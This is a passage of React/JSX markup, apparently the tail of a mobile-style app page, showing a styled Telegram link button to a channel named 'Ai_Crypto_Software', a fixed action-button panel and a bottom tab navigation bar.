                  <a href="https://t.me/Ai_Crypto_Software" target="_blank" rel="noopener noreferrer" className="mt-6 flex items-center justify-center gap-3 w-full py-5 rounded-2xl bg-gradient-to-r from-primary to-accent text-white font-black text-[11px] uppercase tracking-[0.3em] hover:shadow-glow transition-all duration-300 hover:scale-[1.03] active:scale-95 shadow-lg">
                    <ExternalLink className="w-4 h-4" /> TELEGRAM
                  </a>
                </section>
              </div>
            )}
          </div>
      </main>
      
      <div className="fixed bottom-[calc(5rem+env(safe-area-inset-bottom))] left-0 right-0 z-[51] flex justify-center items-center px-4">
        <div className="w-full bg-black/20 backdrop-blur-xl border border-white/10 rounded-3xl">
            <ActionButtons />
        </div>
      </div>
      
      <nav className="fixed bottom-0 left-0 right-0 h-20 bg-black/50 backdrop-blur-2xl border-t border-white/10 z-[52] flex justify-around items-center pb-[env(safe-area-inset-bottom)]">
        {navItems.map((item) => (
          <button
            key={item.id}
            onClick={() => changeTab(item.id)}
            className={cn(
              "flex flex-col items-center justify-center w-full h-full transition-colors duration-300",
              activeTab === item.id ? 'text-primary' : 'text-gray-500 hover:text-white'
            )}
          >
            <item.icon className="w-7 h-7" />
          </button>
        ))}
      </nav>

    </div>
  )
}
    
    




    

    

    
